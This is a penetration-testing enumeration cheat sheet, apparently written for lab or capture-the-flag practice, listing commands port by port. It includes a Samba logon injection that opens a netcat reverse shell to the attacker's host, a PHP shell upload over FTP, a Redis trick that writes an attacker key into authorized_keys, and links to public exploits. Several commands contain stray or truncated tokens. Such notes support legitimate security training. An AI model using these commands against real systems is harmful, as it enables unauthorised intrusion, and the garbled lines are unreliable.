# Enumeration


## Port Scanning :



```bash
nmap -sC -sV -o nmap 1 -A -T5 10.10.10.x

# Host Discovery
nmap -sn 10.10.1.1-254 -vv -oA hosts
netdiscover -r 10.10.10.0/24

# DNS server discovery
nmap -p 53 10.10.10.1-254 -vv -oA dcs

# NSE Scripts Scan
* nmap -sV --script=vulscan/vulscan.nse

# Port specific NSE script list :
ls /usr/share/nmap/scripts/ssh*
ls /usr/share/nmap/scripts/smb*

# Scanning all 65535 ports :

masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.x -e tun0 > ports
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | 
nmap -Pn -sV -sC -p$ports 10.10.10.x

# Running specific NSE scripts :
nmap -Pn -sC -sV --script=vuln*.nse -p$ports 10.10.10.x -T5 -A
```
sC - default scripts, sV - scan for versions, oA- output all formats. 

Optional - sT (performs full scan instead of syn-scan to prevent getting flagged by firewalls)
From Apache Version to finding Ubuntu version -> ubuntu httpd versions

## FTP : (Port 21)

anonymous login check
- ftp <ip address>
- username : anonymous
- pwd : anonymous
- file upload -> put shell.php


## SSH : (Port 22)



id_rsa.pub : Public key that can be used in authorized_keys for login

id_rsa : Private key that is used for login. Might ask for password. can be cracked with
ssh2john and john

- id_rsa
- ssh -i id_rsa user@10.10.10.x
- For passwordless login, add id_rsa.pub to target's authorized_keys
- ssh2john

# DNS Zone transfer check : (Port 53)


- If port 53 is open
- Add host to /etc/hosts
- dig axfr smasher.htb @10.10.10.135
- [https://ghostphisher.github.io/smasher2](https://ghostphisher.github.io/smasher2)
- Add the extracted domain to /etc/hosts and dig again


# RPC Bind (111)

 ```bash
rpcclient --user="" --command=enumprivs 1 -N 10.10.10.10
rpcinfo –p 10.10.10.10
rpcbind -p 10.10.10.10
```

# RPC (135)

```bash
rpcdump.py 10.11.1.121 -p 135
rpcdump.py 10.11.1.121 -p 135 | grep ncacn_2 np // get pipe names
rpcmap.py ncacn_ip_tcp:10.11.1.121[135]
```

# SMB (139 & 445)

[https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html](https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html)

```bash
nmap --script smb-protocols 10.10.10.10
smbclient -L //10.10.10.10
smbclient -L //10.10.10.10 -N // No password (SMB Null session)
smbclient --no-pass -L 10.10.10.10
smbclient //10.10.10.10/share_name
smbmap -H 10.10.10.10
smbmap -H 10.10.10.10 -u '' -p ''
smbmap -H 10.10.10.10 -s share_name
crackmapexec smb 10.10.10.10 -u '' -p '' --shares
crackmapexec smb 10.10.10.10 -u 'sa' -p '' --shares
crackmapexec smb 10.10.10.10 -u 'sa' -p 'sa' --shares
crackmapexec smb 10.10.10.10 -u '' -p '' --share share_name
enum4linux -a 10.10.10.10
rpcclient -U "" 10.10.10.10
      * enumdomusers
      * enumdomgroups
      * queryuser [rid]
      * getdompwinfo
      * getusrdompwinfo [rid]
ncrack -u username -P rockyou.txt -T 5 10.10.10.10 -p smb -v
mount -t cifs "//10.1.1.1/share/" /mnt/wins
mount -t cifs "//10.1.1.1/share/" /mnt/wins -o vers=1.0,user=root,uid=0

# SMB Shell to Reverse Shell :

 smbclient -U "username%password" //192.168.0.116/sharename
 smb> logon “/=nc ‘attack box ip’ 4444 -e /bin/bash"

```

# SMB Exploits :

 Samba "username map script" Command Execution - CVE-2007-2447
 
- Version 3.0.20 through 3.0.25rc3
- Samba-usermap-exploit.py -
[https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851](https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851)

- Eternal Blue - CVE-2017-0144
- SMB v1 in Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7
- SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and
- Windows 10 Gold, 1511, and 1607; and Windows Server 2016
[https://github.com/adithyan-ak/MS17-010-Manual-Exploit](https://github.com/adithyan-ak/MS17-010-Manual-Exploit)
- SambaCry - CVE-2017-7494
  4.5.9 version and before
[https://github.com/opsxcq/exploit-CVE-2017-7494](https://github.com/opsxcq/exploit-CVE-2017-7494)


SNMP (161)

```bash

  snmpwalk -c 1 public -v1 10.0.0.0
  snmpcheck -t 192.168.1.X -c public
  onesixtyone -c names -i hosts
  nmap -sT -p 161 192.168.X.X -oG snmp_results.txt
  snmpenum -t 192.168.1.X
```

# IRC (194,6667,6660-7000)

- nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000
  irked.htb
- [https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor) (exploit code)

# NFS (2049)


- showmount -e 10.1.1.27
- mkdir /mnt/nfs
- mount -t nfs 192.168.2.4:/nfspath-shown /mnt/nfs
- Permission Denied ? [https://blog.christophetd.fr/write-up-vulnix](https://blog.christophetd.fr/write-up-vulnix/)



# MYSQL (3306)

nmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dumphashes,
mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysqlvariables,
mysql-vuln-cve2012-2122


# Redis (6379)

In the output of config get * you could find the home of the redis user (usually /var/lib/redis
or /home/redis/.ssh), and knowing this you know where you can write the
authenticated_users file to access via ssh with the user redis. If you know the home of other
valid user where you have writable permissions you can also abuse it:

1. Generate a ssh public-private key pair on your pc: ssh-keygen -t rsa
2. Write the public key to a file :
(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
3. Import the file into redis : cat foo.txt | redis-cli -h 10.10.10.10 -x set crackit
4. Save the public key to the authorized_keys file on redis server:


```bash
root@Urahara:~# redis-1 cli -h 10.85.0.52
10.85.0.52:6379> config set dir /home/test/.ssh/
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```

# Port Knocking :

```bash
# TCP
knock -v 192.168.0.116 4 27391 159

# UDP
knock -v 192.168.0.116 4 27391 159 -u

# TCP & UDP
8 knock -v 192.168.1.111 159:udp 27391:tcp 4:udp
```
















